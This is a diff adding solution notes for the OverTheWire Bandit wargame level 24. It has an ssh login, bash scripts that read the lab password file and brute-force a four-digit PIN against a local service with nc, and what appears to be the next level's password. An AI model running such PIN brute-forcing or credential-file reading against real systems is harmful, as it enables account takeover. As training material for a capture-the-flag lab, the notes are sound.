@@ -1,0 +1,46 @@
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+
+# make working directory
+mkdir /tmp/matt3
+touch script.sh
+chmod 777 script.sh
+vim script.sh
+
+# ===========================================================================
+#!/bin/bash 
+ 
+lastpass=$(cat /etc/bandit_pass/bandit24) 
+ 
+for digit1 in $(seq 0 9); 
+do 
+        for digit2 in $(seq 0 9); 
+        do 
+                for digit3 in $(seq 0 9); 
+                do 
+                        for digit4 in $(seq 0 9); 
+                        do 
+                                echo $lastpass$digit1$digit2$digit3$digit4 
+                        done 
+                done 
+        done 
+done 
+ 
+# nc localhost 30002
+# ===========================================================================
+#!/bin/bash 
+ 
+lastpass=$(cat /etc/bandit_pass/bandit24) 
+ 
+for pin in $(seq 0 9999); 
+do 
+        echo "Attempting PIN: $pin" 
+        attempt="$(echo $lastpass$pin | nc -w 1 localhost 30002)" 
+        if ! [[ $attempt == *"Fail"* ]] 
+        then 
+                break 
+        fi 
+done
+# ===========================================================================
+
+> uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
